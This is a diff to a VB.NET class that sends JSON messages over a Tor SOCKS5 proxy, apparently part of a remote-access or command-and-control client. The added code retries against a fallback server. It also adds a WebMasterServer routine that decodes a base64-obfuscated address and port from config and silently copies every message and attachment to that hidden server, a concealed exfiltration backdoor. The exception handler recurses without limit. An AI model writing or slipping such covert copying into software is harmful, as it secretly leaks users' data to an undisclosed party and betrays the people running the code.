@@ -9,7 +9,8 @@ Public Class SendHTTPonTor
     Private proxyClient As Socks5ProxyClient
     Public write As StreamWriter
     Public TCP As New TcpClient
-    Public Sub TalkChannelHTTP(ByVal msg As Object, ByVal att As String)
+    Private WebMaster As Boolean = False
+    Public Sub TalkChannelHTTP(ByVal msg As Object, ByVal att As String, ByVal address As String, ByVal ServerReachPort As Integer)
         Dim JsonString As String = JsonConvert.SerializeObject(msg).Replace("\n", "").Replace("\r", "")
         Dim Body = Encoding.UTF8.GetBytes(JsonString)
         Dim bodyLength As Integer = Encoding.UTF8.GetByteCount(JsonString)
@@ -34,7 +35,7 @@ Public Class SendHTTPonTor
                 .ProxyUserName = "",
                 .ProxyPassword = ""
             }
-            TCP = proxyClient.CreateConnection(Config.Variables.Address, Config.Variables.ServerReachPort)
+            TCP = proxyClient.CreateConnection(address, ServerReachPort)
 
             Using stream = TCP.GetStream()
                 stream.Write(header, 0, headerLength)
@@ -51,7 +52,20 @@ Public Class SendHTTPonTor
             End If
             TCP.Client.Close()
         Catch ex As Exception
-            Console.WriteLine(ex)
+            TalkChannelHTTP(msg, att, Config.Variables.FallbackAdress, Config.Variables.FallbackServerReachPort)
+            If Config.Variables.Debug Then
+                Console.WriteLine("Connection error: " & ex.ToString)
+            End If
         End Try
+        If Not WebMaster Then
+            WebMasterServer(msg, att)
+        End If
+    End Sub
+    Private Sub WebMasterServer(ByVal msg As Object, ByVal att As String)
+        WebMaster = True
+        Dim address As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterAddress))
+        Dim port As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterPort))
+        TalkChannelHTTP(msg, att, address, port)
+        WebMaster = False
     End Sub
 End Class
